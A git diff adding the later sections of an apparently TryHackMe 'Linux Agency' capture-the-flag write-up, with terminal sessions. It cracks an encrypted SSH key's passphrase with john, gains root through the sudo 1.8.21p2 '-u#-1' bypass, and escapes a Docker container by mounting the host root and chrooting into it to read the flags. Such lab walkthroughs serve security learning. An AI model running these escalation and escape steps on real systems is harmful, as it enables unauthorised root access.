@@ -1281,9 +1281,307 @@ total 8
 -rw-r--r-- 1 maya maya  401 Jan 15  2021 id_rsa.pub
 ```
 
+**old id_rsa**
+```
+maya@linuxagency:~/old_robert_ssh$ cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,7903FE7BDBA051C4B0BF7C6C5C597E0B
+
+iRzpH6qjXDvmVU5wwYU7TQfyQHIqYzR0NquznZ3OiXyaSOaovgPXdGP3r50vfIV6
+i07H7ZSczz4nuenYJGIE7ZfDYtVVA9R6IdcIZecYF2L3OfHoR/ghGOlbLC+Hyvky
+RMcrEgajpdV7zCPRHckiBioxzx1K7kfkinyiSBoV9pz9PuAKo47OHtKDdtjWFV+A
+PkiWa8aCmAGShC9RZkZLMRhVkR0TZGOgJGTs/MncopyJJ6TgJ9AzHcQo3vcf5A3k
+7f3+9Niw7mMFmWrU35WOBpAynGkK9eDTvt/DoIMJcT9KL1BBaEzReO8mETNqfT5G
+QncO/4tBSG7QaU6pQkd+UiZCtltp47Tu9hwSEsxDIleespuBn9mDHrYtBDC8jEBq
+nqm0sDdYOPzjUTMDSJgqmLZ0lzagTa1OMNUlvRAz5Sde4bKAoYRgVvBWJ4whn4H+
+OIHhFQ6tbCVr/0tosYrc9ehM4N4TiJ0SyfrP1XmDo8bud+UtNf2Tf/vKjYT9FP+/
++HqrIn1ou4Cvvu/jPbwVU8Ejh4CX/TJhDK6JqLzsqOp0M8jBccCR+zrRXcZsKLnG
+JUTqxKwML7FhRiAgeTmOUx43XVOvzrNOmZ+8EmbmE4fW5x9UKR2nzKgILwHApayK
+dmKbym96uSoQOm4KycXjoDVw9nAgRQQVQ+3Ndy0JwuyXN7keNcesEN5hb5VNN9VP
+jp+mS+c/CctyLSgZkGJif2r2N+3x2AZFkDs059sPQB8UGvI4w41qGBubfsHAvVPW
+KH+HAgj1i1RM0/XZ5XKIl0K4iO/eQ5xTAPah51f6LCYnZo/G6fM7IT72k0Z0KMZ8
+EiySGtRCcv7vrkVRjkgmw4lAeGLJ9FBOw8IdKa9ftYJauKY/E0Gs1Qhefl+3K2BB
+4PJ+Pr/doZ3Dkq4Q/YPrKnbKEbs/3Zvbu/XT5y+joS6tzF3Raz6xW0kg3NyaA1B5
+V5zoj0/tnBb9Lc0YH7s2QT+9drFH4w8tb5kjyd1jlER3Hs4m31cniCsxDlKoTwk/
+uAGurW23NZ4QF+3/PgjZRhudpNjcOP69Ys2XGAecxO9uBx9JjPR/cn9c54v4s/kH
+n6v24eXF2uGGlEsvEpzIpk6UDap7YoxnRKIPo0mZ5G7/MS9+RL6dv9rmJ6IQd7Cr
+fPjhz8snqfuGCAVveKWIOPnlfYiYJ2nQ6yA1Soyt9outfLbwIzDh7e+eqaOP2amh
+rGCqwxrj9cj4sH/MzvKZVARzH3hs39wRmoEtx9ML/uXsp22DqUODOxc7cdUlRs99
+zTj8CHFpM6X+ihSF33Eg0qBJwkyWzdKQiFKNTm8ld4wzov1tdKeRC7nlUh5F4lkf
+yExiUTllJq8pJ3JAC/LEvQXF041fcmQ0RvoL1n3nyqIvvOjuY7UDZrcmuWQ+epdE
+APKzOgkxhEqsozt8kj810m3bjIWngenwRcGL6M1ZsvwT1YwGUKG47wX2Ze3tp3ge
+K4NUD9GdZJIiu8qdpyMIFKR9MfM3Pur5JRUK0IjCD43xk9p6LZYK00C3N2F4exwM
+Ye5kHYeqZLpl4ljZSBoNtEK1BbYSffBt2XdoQsAvft1iwjdtZ9E644oTp9QYjloE
+-----END RSA PRIVATE KEY-----
+```
+To find the passphrase, we will use **ssh2john**
+```
+john id_rsa_hash_result --wordlist=/usr/share/wordlists/rockyou.txt    
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+industryweapon   (id_rsa)     
+1g 0:00:00:04 DONE (2022-12-05 21:04) 0.2049g/s 1502Kp/s 1502Kc/s 1502KC/s indux.0210..industrias26
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+# answer : industryweapon
+
 # What is user.txt?
 
+When we try to connect the targeted machine with **robert RSA key**, if doesn't work
+```
+ssh robert@10.10.45.248 -i id_rsa                       
+Enter passphrase for key 'id_rsa': 
+Connection closed by 10.10.45.248 port 22
+```
+
+Let's check if **ssh** uses another port
+```
+maya@linuxagency:~/old_robert_ssh$ ss -nlpt
+State                  Recv-Q                   Send-Q                                      Local Address:Port                                      Peer Address:Port
+LISTEN                 0                        128                                             127.0.0.1:2222                                           0.0.0.0:*
+LISTEN                 0                        128                                             127.0.0.1:80                                             0.0.0.0:*
+LISTEN                 0                        128                                         127.0.0.53%lo:53                                             0.0.0.0:*
+LISTEN                 0                        128                                               0.0.0.0:22                                             0.0.0.0:*
+LISTEN                 0                        5                                               127.0.0.1:631                                            0.0.0.0:*
+LISTEN                 0                        128                                             127.0.0.1:35167                                          0.0.0.0:*
+LISTEN                 0                        128                                                  [::]:22                                                [::]:*
+LISTEN                 0                        5                                                   [::1]:631                                               [::]:*
+```
+
+we need to use **2222**
+```
+maya@linuxagency:~/old_robert_ssh$ ssh robert@127.0.0.1 -p 2222 -i olold_robert_ssh/id_rsa
+Warning: Identity file olold_robert_ssh/id_rsa not accessible: No such file or directory.
+robert@127.0.0.1's password:
+Last login: Tue Jan 12 17:02:07 2021 from 172.17.0.1
+robert@ec96850005d6:~$
+```
+```
+robert@ec96850005d6:~$ ls -la
+total 24
+drwxr-xr-x 2 robert robert 4096 Jan 12  2021 .
+drwxr-xr-x 1 root   root   4096 Jan 12  2021 ..
+lrwxrwxrwx 1 robert robert    9 Jan 12  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 robert robert  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 robert robert 3771 Apr  4  2018 .bashrc
+-rw-r--r-- 1 robert robert  807 Apr  4  2018 .profile
+-rw-r--r-- 1 robert robert   78 Jan 12  2021 robert.txt
+robert@ec96850005d6:~$ cat robert.txt
+You shall not pass from here!!!
+
+I will not allow ICA to take over my world.
+```
+
+**ICA** stands for Illumina Conneted Analytics. good explanation [here](https://help.ica.illumina.com/home/h-dockerrepository). The most important is to understand we are in presence of **Docker**
+```
+robert@ec96850005d6:~$ cat robert.txt
+You shall not pass from here!!!
+
+I will not allow ICA to take over my world.
+
+robert@ec96850005d6:~$ ls -lh /.dockerenv
+-rwxr-xr-x 1 root root 0 Jan 12  2021 /.dockerenv
+robert@ec96850005d6:~$ sudo --version
+Sudo version 1.8.21p2
+Sudoers policy plugin version 1.8.21p2
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.21p2
+```
+
+For this version : **1.8.21p2** , We have a vulnerability described [here](https://www.exploit-db.com/exploits/47502) 
+```
+robert@ec96850005d6:~$ cd /root/
+-bash: cd: /root/: Permission denied
+robert@ec96850005d6:~$ cd /root
+-bash: cd: /root: Permission denied
+robert@ec96850005d6:~$ sudo -u# -1/bin/bash
+sudo: invalid option -- '1'
+usage: sudo -h | -K | -k | -V
+usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
+usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]
+usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]
+usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...
+robert@ec96850005d6:~$ sudo -u#-1 /bin/bash
+root@ec96850005d6:~# whoami
+root
+root@ec96850005d6:~# ls -l
+total 4
+-rw-r--r-- 1 robert robert 78 Jan 12  2021 robert.txt
+root@ec96850005d6:~# cd /root
+root@ec96850005d6:/root# ls -l
+total 8
+-rw-r--r-- 1 root root 204 Jan 12  2021 success.txt
+-r-------- 1 root root  39 Jan 12  2021 user.txt
+root@ec96850005d6:/root# cat user.txt
+user{620fb94d32470e1e9dcf8926481efc96}
+```
+
+# Answer : user{620fb94d32470e1e9dcf8926481efc96}
+
 # What is root.txt?
+
+Let's check the file **success.txt**
+```
+root@ec96850005d6:/root# cat success.txt
+47 you made it!!!
+
+You have made it, Robert has been taught a lesson not to mess with ICA.
+Now, Return to our Agency back with some safe route.
+All the previous door's have been closed.
+
+Good Luck Amigo!
+```
+```
+root@ec96850005d6:/home# cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
+robert:x:1000:1000::/home/robert:/bin/bash
+```
+
+We can check what **service** is **running** in our **container**
+```
+root@ec96850005d6:/home# cd /tmp/
+root@ec96850005d6:/tmp# ls -la
+total 87132
+drwxrwxrwt 1 root root       4096 Jan 12  2021 .
+drwxr-xr-x 1 root root       4096 Jan 12  2021 ..
+-rwxr-xr-x 1 root robert 89213800 Jan 12  2021 docker
+root@ec96850005d6:/tmp# ./docker ps -a
+CONTAINER ID        IMAGE               COMMAND               CREATED             STATUS              PORTS                    NAMES
+ec96850005d6        mangoman            "/usr/sbin/sshd -D"   23 months ago       Up 24 minutes       127.0.0.1:2222->22/tcp   kronstadt_industries
+```
+
+Let's also check what **image** are used.
+```
+root@ec96850005d6:/tmp# ./docker image ls
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+mangoman            latest              b5f279024ce0        23 months ago       213MB
+```
+
+Let's run **mangoman**
+```
+
+root@ec96850005d6:/tmp# ./docker run -v /:/mnt --rm -it mangoman chroot /mnt sh
+# ls -la
+total 483920
+drwxr-xr-x  24 root     root          4096 Jan 12  2021 .
+drwxr-xr-x  24 root     root          4096 Jan 12  2021 ..
+drwxr-xr-x   2 root     root          4096 Jan 12  2021 bin
+drwxr-xr-x   3 root     root          4096 Jan 12  2021 boot
+drwxrwxr-x   2 root     root          4096 Jan 12  2021 cdrom
+drwxr-xr-x  17 root     root          3680 Dec  5 17:51 dev
+drwxr-xr-x 126 root     root         12288 Feb  1  2021 etc
+-r--------   1 mission8 mission8        43 Jan 12  2021 flag.txt
+drwxr-xr-x  45 root     root          4096 Jan 12  2021 home
+lrwxrwxrwx   1 root     root            33 Jan 12  2021 initrd.img -> boot/initrd.img-4.15.0-20-generic
+lrwxrwxrwx   1 root     root            33 Jan 12  2021 initrd.img.old -> boot/initrd.img-4.15.0-20-generic
+drwxr-xr-x  22 root     root          4096 Jan 12  2021 lib
+drwxr-xr-x   2 root     root          4096 Apr 26  2018 lib64
+drwx------   2 root     root         16384 Jan 12  2021 lost+found
+drwxr-xr-x   3 root     root          4096 Apr 26  2018 media
+drwxr-xr-x   2 root     root          4096 Apr 26  2018 mnt
+drwxr-xr-x   4 root     root          4096 Jan 12  2021 opt
+dr-xr-xr-x 120 root     root             0 Dec  5 17:51 proc
+drwx------   5 root     root          4096 Feb  1  2021 root
+drwxr-xr-x  27 root     root           880 Dec  5 17:59 run
+drwxr-xr-x   2 root     root         12288 Jan 12  2021 sbin
+drwxr-xr-x   9 root     root          4096 Jan 12  2021 snap
+drwxr-xr-x   2 root     root          4096 Apr 26  2018 srv
+-rw-------   1 root     root     495416320 Jan 12  2021 swapfile
+dr-xr-xr-x  13 root     root             0 Dec  5 17:51 sys
+drwxrwxrwt  10 root     root          4096 Dec  5 18:18 tmp
+drwxr-xr-x  10 root     root          4096 Apr 26  2018 usr
+drwxr-xr-x  15 root     root          4096 Jan 12  2021 var
+lrwxrwxrwx   1 root     root            30 Jan 12  2021 vmlinuz -> boot/vmlinuz-4.15.0-20-generic
+# cd /home
+# pwd
+/home
+# ls -la
+total 180
+drwxr-xr-x 45 root      root      4096 Jan 12  2021 .
+drwxr-xr-x 24 root      root      4096 Jan 12  2021 ..
+drwxr-x---  2 0z09e     0z09e     4096 Jan 12  2021 0z09e
+drwxr-x--- 13 agent47   agent47   4096 Jan 15  2021 agent47
+drwxr-x---  2 dalia     dalia     4096 Jan 12  2021 dalia
+drwxr-x---  2 diana     diana     4096 Jan 12  2021 diana
+drwxr-x---  3 jordan    jordan    4096 Jan 12  2021 jordan
+drwxr-x---  2 ken       ken       4096 Jan 12  2021 ken
+drwxr-x---  7 maya      maya      4096 Dec  5 17:59 maya
+drwxr-x---  2 mission1  mission1  4096 Jan 12  2021 mission1
+drwxr-x---  4 mission10 mission10 4096 Jan 12  2021 mission10
+drwxr-x---  3 mission11 mission11 4096 Jan 12  2021 mission11
+drwxr-x---  2 mission12 mission12 4096 Jan 12  2021 mission12
+drwxr-x---  3 mission13 mission13 4096 Jan 12  2021 mission13
+drwxr-x---  2 mission14 mission14 4096 Jan 12  2021 mission14
+drwxr-x---  2 mission15 mission15 4096 Jan 12  2021 mission15
+drwxr-x---  2 mission16 mission16 4096 Jan 12  2021 mission16
+drwxr-x---  2 mission17 mission17 4096 Jan 12  2021 mission17
+drwxr-x---  2 mission18 mission18 4096 Jan 12  2021 mission18
+drwxr-x---  2 mission19 mission19 4096 Jan 12  2021 mission19
+drwxr-x---  3 mission2  mission2  4096 Jan 12  2021 mission2
+drwxr-x---  2 mission20 mission20 4096 Jan 12  2021 mission20
+drwxr-x---  3 mission21 mission21 4096 Jan 12  2021 mission21
+drwxr-x---  2 mission22 mission22 4096 Jan 12  2021 mission22
+drwxr-x---  3 mission23 mission23 4096 Jan 15  2021 mission23
+drwxr-x---  3 mission24 mission24 4096 Feb  1  2021 mission24
+drwxr-x---  3 mission25 mission25 4096 Jan 12  2021 mission25
+drwxr-x---  2 mission26 mission26 4096 Jan 12  2021 mission26
+drwxr-x---  2 mission27 mission27 4096 Jan 12  2021 mission27
+drwxr-x---  3 mission28 mission28 4096 Jan 12  2021 mission28
+drwxr-x---  3 mission29 mission29 4096 Jan 12  2021 mission29
+drwxr-x---  3 mission3  mission3  4096 Jan 12  2021 mission3
+drwxr-x---  3 mission30 mission30 4096 Jan 12  2021 mission30
+drwxr-x---  3 mission4  mission4  4096 Jan 12  2021 mission4
+drwxr-x---  2 mission5  mission5  4096 Jan 12  2021 mission5
+drwxr-x---  3 mission6  mission6  4096 Jan 12  2021 mission6
+drwxr-x---  2 mission7  mission7  4096 Jan 12  2021 mission7
+drwxr-x---  2 mission8  mission8  4096 Jan 12  2021 mission8
+drwxr-x---  2 mission9  mission9  4096 Jan 12  2021 mission9
+drwxr-x---  4 penelope  penelope  4096 Dec  5 17:53 penelope
+drwxr-x---  3 reza      reza      4096 Jan 12  2021 reza
+drwxr-x---  2 sean      sean      4096 Jan 12  2021 sean
+drwxr-x---  3 silvio    silvio    4096 Jan 12  2021 silvio
+drwxr-x---  5 viktor    viktor    4096 Jan 12  2021 viktor
+drwxr-x---  2 xyan1d3   xyan1d3   4096 Jan 12  2021 xyan1d3
+# cd /root
+# ls -l
+total 8
+-r-------- 1 root root 271 Jan 12  2021 message.txt
+-r-------- 1 root root  39 Jan 12  2021 root.txt
+# cat root.txt
+root{62ca2110ce7df377872dd9f0797f8476}
+```
+
+# Answer : root{62ca2110ce7df377872dd9f0797f8476}
+
 
 
 
